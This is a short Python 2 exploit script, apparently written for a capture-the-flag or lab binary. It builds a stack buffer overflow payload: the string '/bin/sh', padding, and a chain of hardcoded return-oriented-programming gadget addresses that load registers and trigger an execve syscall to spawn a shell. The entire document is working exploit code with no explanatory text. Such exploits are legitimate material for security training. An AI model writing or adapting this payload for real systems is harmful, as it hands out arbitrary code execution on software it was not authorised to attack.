import struct

def p(x):
    return struct.pack("<I", x)

LOC_BIN_SH = 0xbffff700
BIN_SH = "/bin/sh\x00"

SYSCALL = 0x0806f31f
POP_EAX = 0x080bbf26
POP_EBX = 0x080481c9
POP_ECX = 0x080e55ad
POP_EDX = 0x0806ec5a
POP_ESI = 0x08049a75


payload = ""
payload += BIN_SH
payload += "A" * ( 0x90 - 4 - len(BIN_SH) )
payload += p(POP_EAX)
payload += p(0xb)
payload += p(POP_EBX)
payload += p(LOC_BIN_SH)
payload += p(POP_ECX)
payload += p(0x0)
payload += p(POP_EDX)
payload += p(0x0)
payload += p(POP_ESI)
payload += p(0x0)
payload += p(SYSCALL)

print payload
